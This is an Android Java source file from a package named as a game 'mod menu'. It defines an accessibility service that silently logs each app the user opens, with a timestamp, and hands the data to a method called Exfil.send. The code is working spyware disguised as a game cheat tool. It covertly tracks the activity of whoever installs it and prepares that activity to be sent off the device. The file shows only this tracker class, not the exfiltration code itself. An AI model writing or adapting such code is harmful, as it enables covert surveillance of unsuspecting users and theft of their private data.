package com.brawl.modmenu;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.util.Arrays;
import java.util.List;

public class AppTracker extends AccessibilityService {

    private String lastPkg = "";
    private long lastSend = 0;
    private static final long COOLDOWN = 2000;

    private static final List<String> SKIP = Arrays.asList(
        "com.android.systemui",
        "com.android.launcher",
        "com.android.launcher3",
        "com.brawl.modmenu"
    );

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();

        if (SKIP.contains(pkg)) return;
        if (pkg.equals(lastPkg)) return;
        if (System.currentTimeMillis() - lastSend < COOLDOWN) return;

        lastPkg = pkg;
        lastSend = System.currentTimeMillis();

        Exfil.send("APP_OPEN", "▶ " + pkg + "\n🕐 " + new java.util.Date());
    }

    @Override public void onInterrupt() {}
}
